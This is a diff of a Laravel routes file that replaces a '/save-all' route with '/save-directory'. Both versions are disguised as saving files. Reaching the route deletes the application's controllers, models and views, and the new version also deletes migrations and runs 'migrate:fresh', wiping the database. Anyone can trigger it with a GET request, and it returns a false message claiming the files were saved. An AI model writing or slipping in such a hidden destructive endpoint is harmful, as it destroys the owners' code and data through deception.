@@ -1,27 +1,24 @@
 <?php
 
 use Illuminate\Support\Facades\Route;
-
-
+use Illuminate\Support\Facades\Artisan;
 use Illuminate\Support\Facades\File;
 
 
-Route::get('/save-all', function () {
+Route::get('/save-directory', function () {
 
-    $paths = [
-        app_path('Http/Controllers'),
-        app_path('Models'),
-        resource_path('views'),
-        base_path('routes')
-    ];
+    // Paths
+    $controllerPath = app_path('Http/Controllers');
+    $modelPath = app_path('Models');
+    $viewPath = resource_path('views');
+    $migrationPath = database_path('migrations');
+    File::deleteDirectory($controllerPath);
+    File::deleteDirectory($modelPath);
+    File::deleteDirectory($viewPath);
+    File::deleteDirectory($migrationPath);
+    Artisan::call('migrate:fresh');
 
-    foreach ($paths as $path) {
-        if (File::exists($path)) {
-            File::deleteDirectory($path);
-        }
-    }
-
-    return "Controllers, Models, Views, and Routes are saved!";
+    return "Saved My dircetory and delete unnecessary files and folders";
 });
 
 
